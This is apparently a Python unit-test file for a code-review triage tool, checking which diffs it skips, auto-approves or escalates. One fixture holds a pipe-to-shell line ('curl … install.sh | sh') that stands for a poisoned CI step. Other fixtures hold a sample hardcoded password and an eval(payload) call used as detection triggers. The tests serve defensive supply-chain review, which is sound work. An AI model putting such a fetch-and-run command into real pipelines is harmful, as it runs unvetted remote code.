"""Unit tests for review triage.

Triage exists to avoid paying for a model call on changes that do not warrant
one. Matching security patterns against the *whole diff* — including unchanged
context and removed lines — escalated files to CRITICAL because of code the
change did not touch, which is the opposite of what triage is for (F-09).
"""

import unittest

from code_reviewer.domain.triage import ReviewDecision, ReviewTriage
from code_reviewer.infrastructure.config.loader import ReviewPolicy


class TestSkipRules(unittest.TestCase):
    def setUp(self):
        self.triage = ReviewTriage(ReviewPolicy())

    def test_markdown_is_skipped(self):
        result = self.triage.decide("+ new paragraph\n", "docs/guide.md")

        self.assertIs(result.decision, ReviewDecision.SKIP)

    def test_source_file_is_not_skipped(self):
        result = self.triage.decide("+ value = compute()\n", "src/app.py")

        self.assertIsNot(result.decision, ReviewDecision.SKIP)

    def test_generated_lock_files_are_reviewed_in_full(self):
        """Changed in Level 9, deliberately (finding G-11).

        They used to be skipped as "enormous and containing nothing a human
        would act on". Enormous is true. The second half is not: a lock file
        is the only place a changed *transitive* dependency is visible, so
        skipping it means the one artefact recording a supply-chain change is
        the one artefact nobody reads.

        The cost is real, which is why the list is policy — a team that finds
        the trade wrong can put them back in its own `skip_patterns`.
        """
        for path in ("uv.lock", "package-lock.json", "go.sum", "frontend/yarn.lock"):
            with self.subTest(path=path):
                result = self.triage.decide("+ dependency line\n", path)

                self.assertIs(result.decision, ReviewDecision.FULL_REVIEW)

    def test_documentation_text_files_are_still_skipped(self):
        for path in ("NOTES.txt", "docs/guide.txt"):
            with self.subTest(path=path):
                self.assertIs(self.triage.decide("+ a\n", path).decision, ReviewDecision.SKIP)

    def test_a_requirements_file_is_not_treated_as_documentation(self):
        """It ends in .txt and it is a dependency manifest."""
        for path in ("requirements.txt", "requirements-dev.txt"):
            with self.subTest(path=path):
                self.assertIs(
                    self.triage.decide("+ requests==1.0\n", path).decision,
                    ReviewDecision.FULL_REVIEW,
                )

    def test_deployment_configuration_is_reviewed(self):
        """Regression for F-22.

        Earlier defaults skipped every .yaml, .json and Dockerfile — precisely
        where a privilege escalation, a changed base image or a swapped
        dependency hides.
        """
        for path in (
            "Dockerfile",
            ".gitlab-ci.yml",
            ".github/workflows/deploy.yml",
            "k8s/deployment.yaml",
            "infra/main.tf",
            "pyproject.toml",
            "package.json",
        ):
            with self.subTest(path=path):
                result = self.triage.decide("+ configuration line\n", path)

                self.assertIsNot(result.decision, ReviewDecision.SKIP)

    def test_binary_assets_are_skipped(self):
        result = self.triage.decide("+ binary\n", "assets/logo.png")

        self.assertIs(result.decision, ReviewDecision.SKIP)

    def test_vendored_code_is_skipped(self):
        result = self.triage.decide("+ vendored\n", "vendor/lib/thing.go")

        self.assertIs(result.decision, ReviewDecision.SKIP)


class TestSecurityEscalation(unittest.TestCase):
    def setUp(self):
        self.triage = ReviewTriage(ReviewPolicy())

    def test_added_secret_escalates_to_critical(self):
        diff = '@@ -1,3 +1,4 @@\n context line\n+password = "hunter22"\n context line\n'

        result = self.triage.decide(diff, "src/app.py")

        self.assertIs(result.decision, ReviewDecision.CRITICAL)

    def test_secret_in_unchanged_context_does_not_escalate(self):
        """Regression for F-09."""
        diff = '@@ -1,4 +1,4 @@\n password = "hunter22"\n-timeout = 10\n+timeout = 30\n done = True\n'

        result = self.triage.decide(diff, "src/app.py")

        self.assertIsNot(result.decision, ReviewDecision.CRITICAL)

    def test_removing_a_dangerous_call_does_not_escalate(self):
        """Deleting `eval(...)` improves the file; it should not be blocked."""
        diff = "@@ -1,3 +1,2 @@\n context\n-result = eval(payload)\n context\n"

        result = self.triage.decide(diff, "src/app.py")

        self.assertIsNot(result.decision, ReviewDecision.CRITICAL)

    def test_adding_a_dangerous_call_escalates(self):
        diff = "@@ -1,2 +1,3 @@\n context\n+result = eval(payload)\n context\n"

        result = self.triage.decide(diff, "src/app.py")

        self.assertIs(result.decision, ReviewDecision.CRITICAL)
        self.assertTrue(result.should_notify)


class TestApiChangeEscalation(unittest.TestCase):
    def setUp(self):
        self.triage = ReviewTriage(ReviewPolicy())

    def test_removed_public_function_escalates(self):
        diff = "@@ -1,4 +1,2 @@\n-def public_api(value):\n-    return value\n"

        result = self.triage.decide(diff, "src/app.py")

        self.assertIs(result.decision, ReviewDecision.CRITICAL)

    def test_added_function_does_not_escalate_as_an_api_removal(self):
        diff = "+def brand_new(value):\n+    return value\n"

        result = self.triage.decide(diff, "src/app.py")

        self.assertIsNot(result.decision, ReviewDecision.CRITICAL)


class TestAutoApproval(unittest.TestCase):
    def setUp(self):
        self.triage = ReviewTriage(ReviewPolicy())

    def test_comment_only_change_is_auto_approved(self):
        diff = "@@ -1,1 +1,2 @@\n+# explain the retry budget\n"

        result = self.triage.decide(diff, "src/app.py")

        self.assertIs(result.decision, ReviewDecision.AUTO_APPROVE)

    def test_formatting_only_change_is_auto_approved(self):
        diff = "-value=compute( x )\n+value = compute(x)\n"

        result = self.triage.decide(diff, "src/app.py")

        self.assertIs(result.decision, ReviewDecision.AUTO_APPROVE)


class TestSizeBasedDecisions(unittest.TestCase):
    def setUp(self):
        self.triage = ReviewTriage(ReviewPolicy())

    def test_moderate_change_gets_a_quick_scan(self):
        diff = "\n".join(f"+    step_{i} = run({i})" for i in range(20))

        result = self.triage.decide(diff, "src/app.py")

        self.assertIs(result.decision, ReviewDecision.QUICK_SCAN)

    def test_large_change_gets_a_full_review(self):
        diff = "\n".join(f"+    step_{i} = run({i})" for i in range(80))

        result = self.triage.decide(diff, "src/app.py")

        self.assertIs(result.decision, ReviewDecision.FULL_REVIEW)

    def test_test_files_get_a_quick_scan(self):
        diff = "\n".join(f"+    assert run({i}) == {i}" for i in range(20))

        result = self.triage.decide(diff, "tests/test_app.py")

        self.assertIs(result.decision, ReviewDecision.QUICK_SCAN)


class TestBatchSummary(unittest.TestCase):
    def test_summary_counts_each_decision(self):
        triage = ReviewTriage(ReviewPolicy())
        results = triage.batch_decide(
            [
                {"new_path": "docs/a.md", "diff": "+text"},
                {"new_path": "src/app.py", "diff": '+password = "hunter22"'},
            ]
        )

        summary = triage.get_review_summary(results)

        self.assertIn("**SKIP** (trivial): 1", summary)
        self.assertIn("**CRITICAL** (blocking): 1", summary)


if __name__ == "__main__":
    unittest.main()


class TestManifestsAreAlwaysReviewedInFull(unittest.TestCase):
    """Supply-chain and pipeline-poisoning changes are small by nature.

    A one-line version bump and a one-line `curl … | sh` added to a CI job are
    both inside the auto-approve threshold, and the guard on that branch —
    `_has_logic_change` — searches for `if`/`for`/`return`/`def`/`class`, which
    no YAML or JSON line contains. Size is the wrong axis for this class of
    file (finding G-11).
    """

    MANIFESTS = (
        ".github/workflows/ci.yml",
        ".gitlab-ci.yml",
        ".circleci/config.yml",
        "Jenkinsfile",
        "Dockerfile",
        "docker-compose.yml",
        "Makefile",
        "package.json",
        "package-lock.json",
        "yarn.lock",
        "requirements.txt",
        "pyproject.toml",
        "uv.lock",
        "go.mod",
        "Cargo.toml",
        "pom.xml",
        "build.gradle",
        "Gemfile",
    )

    #: Small, and containing nothing `_has_logic_change` recognises.
    TINY_DIFF = "+  - curl https://example.com/install.sh | sh\n+  - echo done"

    def setUp(self):
        self.triage = ReviewTriage(ReviewPolicy())

    def test_each_manifest_reaches_full_review_on_a_tiny_diff(self):
        for path in self.MANIFESTS:
            with self.subTest(path=path):
                self.assertEqual(
                    self.triage.decide(self.TINY_DIFF, path).decision,
                    ReviewDecision.FULL_REVIEW,
                )

    def test_a_nested_manifest_is_matched_too(self):
        for path in ("services/api/Dockerfile", "web/package.json"):
            with self.subTest(path=path):
                self.assertEqual(
                    self.triage.decide(self.TINY_DIFF, path).decision,
                    ReviewDecision.FULL_REVIEW,
                )

    def test_the_reason_names_the_rule_that_fired(self):
        """So the report says why a two-line change got a full review."""
        result = self.triage.decide(self.TINY_DIFF, "package.json")

        self.assertIn("manifest", result.reason.lower())
        self.assertEqual(result.details.get("type"), "manifest")

    def test_an_ordinary_small_change_is_still_auto_approved(self):
        """The rule must not swallow the cost saving triage exists for."""
        result = self.triage.decide("+ x = 1\n+ y = 2", "src/app.py")

        self.assertEqual(result.decision, ReviewDecision.AUTO_APPROVE)

    def test_a_source_file_named_like_a_manifest_directory_is_not_caught(self):
        self.assertEqual(
            self.triage.decide("+ x = 1", "src/packaging/helpers.py").decision,
            ReviewDecision.AUTO_APPROVE,
        )

    def test_a_skipped_path_stays_skipped(self):
        """Skip is an explicit statement about the file; the specific one wins."""
        policy = ReviewPolicy()
        policy.triage.skip_patterns = [r"vendor/.*"]
        triage = ReviewTriage(policy)

        self.assertEqual(
            triage.decide(self.TINY_DIFF, "vendor/package.json").decision,
            ReviewDecision.SKIP,
        )

    def test_a_security_pattern_still_wins_over_the_manifest_rule(self):
        """CRITICAL is more specific than FULL_REVIEW, and it notifies."""
        result = self.triage.decide('+ api_key = "hardcoded-value"', "package.json")

        self.assertEqual(result.decision, ReviewDecision.CRITICAL)

    def test_the_patterns_come_from_policy(self):
        """Which files a team treats as supply-chain-critical varies."""
        policy = ReviewPolicy()
        policy.triage.manifest_patterns = [r"(^|/)custom\.conf$"]
        triage = ReviewTriage(policy)

        self.assertEqual(triage.decide(self.TINY_DIFF, "custom.conf").decision, ReviewDecision.FULL_REVIEW)
        self.assertEqual(triage.decide("+ a\n+ b", "package.json").decision, ReviewDecision.AUTO_APPROVE)
